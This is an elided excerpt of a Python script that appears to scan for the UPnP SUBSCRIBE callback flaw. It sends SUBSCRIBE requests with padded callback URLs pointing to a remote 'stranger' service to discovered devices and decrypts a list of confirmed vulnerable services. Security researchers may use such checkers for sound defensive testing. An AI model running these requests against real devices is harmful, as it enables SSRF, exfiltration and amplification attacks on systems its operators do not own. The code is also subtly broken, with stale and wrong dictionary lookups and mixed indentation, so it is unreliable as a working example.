...
def subscribe(URL,callbackURL):
    ...
    'NT': 'upnp:event',
    'TIMEOUT': 'Second-300'} 
	print("SUBSCRIBE callbackURL length="+ str(len(callbackURL)))
	req = requests.request('SUBSCRIBE', URL,headers=myheaders)
	result = dict([("callbackURL", callbackURL)])
...
def confirmvulnerableservices(path,key):
	...
	try:
		...
		print('')
		print('Decyrpting vulnerable services with key:' , key)
		f = Fernet(key)
		i=1
		decryptedvulnerableservices=[]
		print(colored('\nVerified vulnerable services: ','red'))
		for line in vulnerableservices.splitlines():
			url = f.decrypt(line.encode()).decode()
			print(colored(str(i)+':	'+url,'red') + "\t\tlength = "+str(len(results[url]["callbackURL"])))
			decryptedvulnerableservices.append(url)
			i=i+1
		...
		for unverifiedservice in unverifiedservices:
			print(colored(str(i)+':	'+unverifiedservice,'yellow') + "\t\tlength = "+str(len(results[url]["callbackURL"])))
			i=i+1
	except:
...
if len(devices)>0:
	...
	if input('Do you want to continue? y/N ') == 'y':
		...
		for serv in services:
			...
			if total_length != 0:
				path += "&additional="
				path += "".join(random.choices(string.ascii_letters, k=total_length-len(path)+random.randint(-length_range, length_range)))

			print('Calling stranger for ', serv, 'with path of length',str(len(path)))
			subscribe(serv,path)
		...
		for url, result in results:
			if result["success"]:
				successes.append(len(result["callbackURL"]))
			else:
				failures.append(len(results["callbackURL"]))
		print("success lengths = "+str(successes))
		print("failure lengths = "+str(failures))
